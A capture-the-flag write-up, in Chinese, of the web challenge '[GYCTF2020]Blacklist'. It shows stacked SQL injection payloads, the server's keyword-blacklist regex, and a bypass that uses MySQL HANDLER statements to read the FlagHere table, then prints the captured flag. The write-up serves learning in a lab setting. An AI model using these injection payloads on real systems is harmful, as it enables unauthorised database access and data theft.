# [GYCTF2020]Blacklist

[题目地址](https://buuoj.cn/challenges#[GYCTF2020]Blacklist)

一看到这题的页面我就想到了之前做过的[一道题](https://github.com/C0nstellati0n/NoobCTF/blob/main/CTF/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C/2%E7%BA%A7/Web/supersqli.md)。结果发现之前写的笔记里面爆库爆表爆字段名都能用，表名是FlagHere，就是到最后爆字段内容时出现了过滤。

- ';set @sql=concat('s','elect * from `FlagHere`');PREPARE pre FROM @sql;EXECUTE pre; #
  > return preg_match("/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i",$inject);

增加了过滤内容，预处理语句这条路是走不通了。当时那道题其实有三种解法，其中两种都在这里被过滤了，只剩下最后一种——[handler](https://blog.csdn.net/JesseYoung/article/details/40785137)。用法很简单，这篇帖子里全部都提到了。根据handler语句构造payload。

- ';handler FlagHere open;handler FlagHere read first;handler FlagHere close;#

handler 表名 open 打开一个表，此时我们获取了打开表的句柄。handler 表名 read first 读取打开的句柄的第一行内容，此处第一行内容就是flag。handler 表名 close 关闭刚才打开的句柄。

## Flag
> flag{2141300c-f5eb-4c18-be7a-7451d7475286}